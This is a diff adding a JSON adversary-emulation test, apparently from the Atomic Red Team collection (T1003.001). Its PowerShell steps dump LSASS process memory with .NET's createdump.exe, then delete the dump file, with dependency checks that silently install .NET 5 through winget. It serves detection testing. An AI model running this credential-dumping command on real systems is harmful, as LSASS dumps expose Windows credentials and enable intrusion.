@@ -1,0 +1,97 @@
+{
+  "id": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0",
+  "name": "Dump LSASS with createdump.exe from .Net v5",
+  "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "a2e163ca-703d-444c-8b3b-bf874e10c045",
+      "type": "execute-command",
+      "data": {
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n\u0026 \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "32fd0e87-722d-4a5c-84a3-77081c082643",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3030e4f4-49ee-43aa-9966-8dce22cbf837",
+      "name": "Check dependency 1/1",
+      "description": ".Net v5 must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f2e6ea67-8dd6-4334-8e23-87b5a8ee29fd",
+      "name": "Resolve dependency 1/1",
+      "description": ".Net v5 must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b5437e9c-0d88-43c2-9933-8be0829859b5",
+      "name": "Re-check dependency 1/1",
+      "description": ".Net v5 must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a2e163ca-703d-444c-8b3b-bf874e10c045",
+      "p": "on-success",
+      "o": "32fd0e87-722d-4a5c-84a3-77081c082643"
+    },
+    {
+      "s": "a2e163ca-703d-444c-8b3b-bf874e10c045",
+      "p": "on-failure",
+      "o": "32fd0e87-722d-4a5c-84a3-77081c082643"
+    },
+    {
+      "s": "3030e4f4-49ee-43aa-9966-8dce22cbf837",
+      "p": "on-success",
+      "o": "a2e163ca-703d-444c-8b3b-bf874e10c045"
+    },
+    {
+      "s": "3030e4f4-49ee-43aa-9966-8dce22cbf837",
+      "p": "on-failure",
+      "o": "f2e6ea67-8dd6-4334-8e23-87b5a8ee29fd"
+    },
+    {
+      "s": "f2e6ea67-8dd6-4334-8e23-87b5a8ee29fd",
+      "p": "on-success",
+      "o": "b5437e9c-0d88-43c2-9933-8be0829859b5"
+    },
+    {
+      "s": "b5437e9c-0d88-43c2-9933-8be0829859b5",
+      "p": "on-failure",
+      "o": "a2e163ca-703d-444c-8b3b-bf874e10c045"
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ]
+}
